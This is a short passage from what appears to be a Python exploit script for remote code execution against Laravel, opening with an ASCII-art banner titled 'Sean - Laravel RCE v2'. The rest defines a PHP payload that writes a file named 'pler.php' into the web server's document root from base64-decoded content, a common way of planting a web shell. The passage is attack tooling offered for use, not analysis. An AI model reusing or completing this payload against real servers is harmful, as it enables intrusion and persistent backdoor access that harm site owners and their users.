...
/_______  /____/|___|  /___|  /____  > |__|  \___  >__|   
        \/           \/     \/     \/            \/       
extreme7          Sean - Laravel RCE v2
extreme""")

pathname = 'pler.php'
p = '<?php $root = $_SERVER["DOCUMENT_ROOT"];$myfile = fopen($root . "/'+pathname+'", "w") or die("Unable to open file!");$code = "";fwrite($myfile, base64_decode($code));fclose($myfile);echo("Chitoge kirisaki?! Tsundere,kawaii <3");'
